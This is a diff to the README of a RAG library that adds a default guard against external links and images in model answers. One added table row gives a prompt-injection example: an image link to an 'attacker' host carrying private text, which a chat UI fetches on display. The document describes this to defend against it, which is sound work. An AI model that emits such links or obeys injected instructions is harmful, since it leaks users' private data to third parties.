@@ -299,7 +299,7 @@ rag = RAG(
     rate_limit_key=None,                # callable(GuardContext) -> str: who limits / budgets count (default: user id)
     guard_store=None,                   # GuardStore for limit counters (default: in this process only)
     stream_holdback_chars=64,           # how far streamed text may trail the model while output guards check it (min 40)
-    secure_defaults=True,               # always-on protections (citation access, tool limit, injection/secret flags)
+    secure_defaults=True,               # always-on protections (citation access, tool limit, injection/secret flags, external links)
     guard_models=None,                  # optional local models for tier 1 guards (never downloaded for you)
     judge_model=None,                   # tier 2 LLM judge for unsure / high-risk checks (default: cheapest model)
     judge_budget=None,                  # JudgeBudget(max_calls_per_minute=..., max_usd_per_day=...): past it, tier 1 stands
@@ -1123,6 +1123,7 @@ result.metadata["blocked_by"]  # set when a guard blocked the query
 | Agent tool limit: `ToolPolicy(max_tool_calls=10)` | Stops a looping agent. The default `max_steps=4` stays far below it. | `secure_defaults={"tool_limit": False}`, or pass your own `tool_policy=` |
 | Injection flags: `InjectionHeuristic(flag_only=True)` | Reports injection-like questions in `result.guard_flags` and a `guard_flag` event on `on_event`. Never blocks. | `secure_defaults={"injection_flags": False}` |
 | Secret flags: `OutputLeakGuard(check_pii=False, flag_only=True)` | Reports API keys, tokens and private keys in the answer, the same way. Never masks, and never looks at PII. | `secure_defaults={"secret_flags": False}` |
+| External links: `ExternalLinkGuard()` | Removes images, HTML tags and links in the answer that point anywhere the retrieved sources did not. A prompt injection in a document could otherwise make the answer carry `![x](https://attacker/?q=<private text>)`, which a chat UI fetches on display. Links to the sources are kept. This is the one default that changes such answers; answers without outside links are unchanged and leave no record. Streams stay word by word. | `secure_defaults={"external_links": False}`, or `output_guards=[ExternalLinkGuard(allow_domains=["docs.example.com"])]` to trust more hosts |
 
 `secure_defaults=False` turns all four off. A guard of the same class that you configure yourself (e.g. a blocking `InjectionHeuristic()` in `input_guards`) replaces the default one. Flag-only guards are quiet: they add no trace stage, and they add nothing to the result unless they find something. Flag-only output guards run once on the finished answer, so `rag.stream(...)` still yields every model token as it arrives, and their flags are on the final result. With `access_control=True`, the always-on `CitationAccessGuard` has to see whole `[n]` markers, so the stream trails the model by about one word (8 characters), not one token. Any guard can run this way: `OutputLeakGuard(flag_only=True)`.
 
